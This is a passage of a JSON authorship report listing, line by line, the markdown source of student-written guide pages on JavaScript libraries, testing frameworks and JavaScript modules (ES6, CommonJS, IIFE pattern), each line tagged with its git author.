        "content": "- [Angular vs React vs Vue](https://medium.com/unicorn-supplies/angular-vs-react-vs-vue-a-2017-comparison-c5c52d620176)"
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "-"
        },
        "content": "Links to VueJs tutorials and practices:"
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "-"
        },
        "content": "- [VueJS Official Website](https://vuejs.org)"
      },
      {
        "lineNumber": 343,
        "author": {
          "gitId": "-"
        },
        "content": "- [VueSchool](https://vuejs.org/)"
      },
      {
        "lineNumber": 344,
        "author": {
          "gitId": "-"
        },
        "content": "- [Laracast](https://laracasts.com/series/learn-vue-2-step-by-step)"
      },
      {
        "lineNumber": 345,
        "author": {
          "gitId": "-"
        },
        "content": "- [Vuetify](https://vuetifyjs.com/zh-Hans/)"
      },
      {
        "lineNumber": 346,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 347,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 33,
      "jamessspanggg": 58,
      "-": 256
    }
  },
  {
    "path": "contents/javascript/Javascript-libraries.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Libraries"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Libraries"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: Li Kai"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "As a beginner, there may be some hesistation in using libraries. The big advantage is the amount of benefit it brings to the team. Whether its the overhead of having to load the library, or having to learn a large library\u0027s syntax, not having to maintain more code makes the project more manageable, maintainable and that alone makes it worth its cost."
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "## Utility Libraries"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "The limitation to Javascript is its limited utility library. That is why libraries like [lodash](https://lodash.com/) is such a popular module. There are a lot of functions being provided, which would help a lot in making shorter, more coherent syntax. Lodash reduces the need to write and maintain your own `_.assign` or `_.range` and even provides powerful functions such as `_.merge` and `_.groupBy`."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "## Testing Libraries"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "There are a large amount of Javascript testing libraries. The below is a non-exhaustive list."
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "- [AVA](https://github.com/avajs/ava)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "- [Jasmine](https://jasmine.github.io/)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "- [Jest](https://facebook.github.io/jest/)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "- [Mocha](https://mochajs.org/)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "- [QUnitJs](https://qunitjs.com)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "- [Tape](https://github.com/substack/tape)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "So which one do you choose? Among the above, I have had the opportunity of write in all of the above except Tape. "
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "The general advice is to go for Mocha if you are new, due to its [large community](https://stateofjs.com/2016/testing/) and therefore overall amount of help available. When you are familiar with Mocha and understand its pitfalls (speed and organisation), you can explore other libraries such as Jest."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Jest, due to its speed, support for React.js, support for asynchronous testing and helpful terminal outputs, seems to be the upcoming major player. The fact that it is being made by Facebook is icing to the cake."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "The odd test framework in the list above is QUnit, which is a test framework that runs on the browser instead of node.js like the others. QUnit has been around longer. Unless you are running JQuery and need to test for browser or UI related bugs, it is no longer a conventional choice."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 1,
      "-": 42
    }
  },
  {
    "path": "contents/javascript/Javascript-modules.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: \"Javascript: Modules\""
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Javascript: Modules"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author: Gilbert Emerson**\u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: Chelsey Ong, Ong Shu Peng, Amrut Prabhu"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* [What Is a Module?‎](#what-is-a-module)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "* [How to Modularize JavaScript Code?‎](#how-to-modularize-javascript-code)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "    * [ES6 modules‎](#es6-modules)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    * [CommonJS‎](#commonjs)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Module Pattern‎](#module-pattern)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "* [Which to use?‎](#which-to-use)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "* [How to start?‎](#how-to-start)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "* [Further Reading‎](#further-reading)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "This article assumes the reader has some basic knowledge of JavaScript."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is a Module?"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "openorclose"
        },
        "content": "In programming, the term module (other similar terms: _package, library, dependency, plugin_) is used to refer to _a small part of code that is broken up from a larger code base_."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "Modules help programmers in many ways. Here are some of the examples:"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "openorclose"
        },
        "content": "**1. Modules make code managable** \u003cbr\u003e"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Using modules to break a code base into smaller parts can make it more manageable, especially for a large code base."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Let\u0027s say you have an application with functionalities A and B, where functionality A needs functionality B. Without modules, both of these functionalities are mixed together in the code base without a clear separation. With modules, we can separate these 2 functionalities. When A needs B, A will \"include\" B and A will be able to work as if A and B had never been separated."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "**2. Modules help minimize name clashes** \u003cbr\u003e"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Breaking code into modules results in breaking the code\u0027s namespace into smaller parts too. This will help in minimizing name clashes and the need for global variables."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "**3. Modules promote reuse** \u003cbr\u003e"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Modules allow developers to reuse their code. If we have an application that relies on the same string comparison function in multiple files, we can separate that function into a module. Now we can \"include\" the function from that module instead of repeating that function definition in all the files where it is needed."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "## How to Modularize JavaScript Code?"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "openorclose"
        },
        "content": "There are 3 common ways to use modules in JavaScript: 1. using ES6 modules, 2. using CommonJS, 3. using the module pattern. While ES6 modules is the most recent and the official implementation, this article covers the other two as well because there are still a large number of existing projects that use them."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### ES6 Modules"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Introduced in 2015, ES6 modules is the official implementation of modules in JavaScript. It introduces 2 new syntax `import` and `export` to support modules in JavaScript."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "openorclose"
        },
        "content": "In the example below, `index.js` needs the function `sumOfVariable` from `anExampleModule.js`. So, `anExampleModule.js` will need to _export_ the function using the `export` syntax and `index.js` will need to _import_ that function using the `import` syntax."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "// anExampleModule.js"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "var variableOne \u003d 1;"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "var variableTwo \u003d 2;"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "export sumOfVariable() {"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "    return variableOne + variableTwo;"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "// index.js"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "import * as anExampleModule from \u0027./anExampleModule.js\u0027;"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "anExampleModule.sumOfVariable(); // 3"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "ES6 modules supports advanced features such as _[asynchronous loading](https://exploringjs.com/es6/ch_modules.html#sec_modules-in-browsers), [tree shaking](https://medium.com/@netxm/what-is-tree-shaking-de7c6be5cadd), [static code analysis](https://exploringjs.com/es6/ch_modules.html#static-module-structure)_ and [dynamic imports](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import#Dynamic_Imports). These features will not be covered in this article."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "A more in-depth explanation of ES6 modules can be found in the [Modules chapter of the Exploring ES6 online book](https://exploringjs.com/es6/ch_modules.html)."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "openorclose"
        },
        "content": "ES6 modules is supported by all major browsers as of 2020. However, you may need to support browsers that do not implement ES6 modules."
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "openorclose"
        },
        "content": "One possible solution is to use a _[transpiler](https://scotch.io/tutorials/javascript-transpilers-what-they-are-why-we-need-them)_ such as _[Babel](https://babeljs.io/)_ and a _[bundler](https://medium.com/@gimenete/how-javascript-bundlers-work-1fc0d0caf2da)_ such as _[Webpack](https://webpack.js.org/)_ to serve your application to unsupported browsers."
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Alternatively, use the two other methods described below."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "### CommonJS"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "CommonJS is in wide use today because it is used by _NodeJS_ which in turn is used by many JavaScript applications."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "openorclose"
        },
        "content": "The example below will replicate the same example in the previous section using CommonJS. `index.js` needs the function `sumOfVariable` from `anExampleModule.js`. So, `anExampleModule.js` module will need to _export_ the function using the `module.exports` syntax and `index.js` module will need to _import_ that function using the `require` syntax."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "// anExampleModule.js"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "var variableOne \u003d 1;"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "var variableTwo \u003d 2;"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "sumOfVariable \u003d function() {"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "    return variableOne + variableTwo;"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "module.exports \u003d {"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "  sumOfVariable: sumOfVariable,"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "};"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "// index.js"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "var anExampleModule \u003d require(\u0027./anExampleModule.js\u0027);"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "anExampleModule.sumOfVariable(); // 3"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "A more in-depth explanation of CommonJS can be found in the [Modules chapter of NodeJS API documentation](https://nodejs.org/docs/latest/api/modules.html)."
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Note that CommonJS modules only work natively in NodeJS. If you would like to use CommonJS modules in browsers, you will still need to use a bundler such as _[Webpack](https://webpack.js.org/)_."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If you are only writing JavaScript for the client side and not using NodeJS at all, and also need to support a wide variety of browsers, consider using the last method described. It has been supported by browsers ever since they started supporting JavaScript."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Module Pattern via Namespaces"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Using a technique in JavaScript called _[IIFE (Immediately Invoked Function Expression)](https://developer.mozilla.org/en-US/docs/Glossary/IIFE)_, JavaScript developers can create a namespace by wrapping their code in an IIFE."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox\u003e"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "An IIFE (Immediately Invoked Function Expression) is a JavaScript function that runs as soon as it is defined. \u003cbr\u003e"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "**Syntax:** `(function() { statements })();`"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "_Source: [MDN Glossary - IIFE](https://developer.mozilla.org/en-US/docs/Glossary/IIFE)_"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "openorclose"
        },
        "content": "The example below will replicate the same example in previous sections using the module pattern. `index.js` needs the function `sumOfVariable` from `anExampleNamespace.js`. To achieve this, we use the `\u003cscript\u003e` tag in HTML to include `anExampleNamespace.js` for `index.js` to use."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "```html"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c!-- index.html --\u003e"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003cscript src\u003d\"./anExampleNamespace.js\" /\u003e"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cscript src\u003d\"./index.js\" /\u003e"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "openorclose"
        },
        "content": "// anExampleNamespace.js"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "openorclose"
        },
        "content": "var anExampleNamespace \u003d (function() {"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "    var variableOne \u003d 1;"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "    var variableTwo \u003d 2;"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "    var sumOfVariable \u003d function() {"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "        return variableOne + variableTwo;"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "    // We return an object with functions or variables"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "    // that we want to be exposed"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "    return {"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "        sumOfVariable: sumOfVariable"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "})()"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "// index.js"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "openorclose"
        },
        "content": "anExampleNamespace.sumOfVariable(); // 3"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "openorclose"
        },
        "content": "The result of including the script containing the `anExampleNamespace` object in the HTML will be as follows:"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "openorclose"
        },
        "content": "// anExampleNamespace.js"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "openorclose"
        },
        "content": "var anExampleNamespace \u003d (function() {"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "    var variableOne \u003d 1;"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "    var variableTwo \u003d 2;"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "    var sumOfVariable \u003d function() {"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "        return variableOne + variableTwo;"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "    // We return an object with functions or variables"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "    // that we want to be exposed"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "    return {"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "        sumOfVariable: sumOfVariable"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "})()"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "// index.js"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
